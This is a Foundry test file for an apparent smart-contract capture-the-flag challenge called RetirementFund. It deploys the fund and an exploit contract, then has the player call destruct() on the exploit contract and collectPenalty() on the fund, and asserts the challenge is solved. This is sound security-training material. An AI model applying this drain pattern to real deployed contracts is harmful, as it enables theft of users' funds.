// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Test } from 'forge-std/Test.sol';
import { console } from 'forge-std/console.sol';
import { RetirementFund, ExploitContract } from '../src/RetirementFund.sol';

contract RetirementFundTest is Test {
  RetirementFund public retirementFund;
  ExploitContract public exploitContract;
  address player = makeAddr('player');

  function setUp() public {
    // Deploy contracts
    retirementFund = (new RetirementFund){ value: 1 ether }(player);
    exploitContract = (new ExploitContract){ value: 1 ether }(retirementFund, player);
  }

  function testIncrement() public {
    vm.deal(address(exploitContract), 1 ether);
    // Test your Exploit Contract below
    // Use the instance retirementFund and exploitContract
    vm.startPrank(player);
    exploitContract.destruct();
    retirementFund.collectPenalty();
    vm.stopPrank();
    _checkSolved();
  }

  function _checkSolved() internal view {
    assertTrue(retirementFund.isComplete(), 'Challenge Incomplete');
  }

  receive() external payable {}
}